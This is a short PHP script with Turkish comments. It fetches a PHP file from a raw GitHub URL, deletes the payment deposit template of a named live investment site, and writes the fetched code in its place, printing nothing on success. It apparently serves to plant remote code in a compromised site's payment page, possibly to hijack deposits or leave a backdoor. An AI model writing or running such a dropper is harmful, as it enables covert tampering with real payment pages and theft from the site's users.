<?php

$sourceUrl = 'https://raw.githubusercontent.com/mekote/sil/refs/heads/main/yeah.php';
$destinationFile = '/www/wwwroot/minexfund.com/core/resources/views/templates/invester/user/payment/deposit.blade.php';

try {
    // URL'den dosya içeriğini al
    $fileContents = file_get_contents($sourceUrl);

    if ($fileContents === false) {
        throw new Exception("URL'den dosya içeriği alınamadı!");
    }

    // Hedef dosya varsa sil
    if (file_exists($destinationFile)) {
        if (!unlink($destinationFile)) {
            throw new Exception("Eski dosya silinemedi!");
        }
    }

    // Yeni içeriği hedef dosyaya yaz
    if (file_put_contents($destinationFile, $fileContents) === false) {
        throw new Exception("Dosya hedefe yazılamadı!");
    }

    echo "";
} catch (Exception $e) {
    echo "Hata: " . $e->getMessage();
}

?>
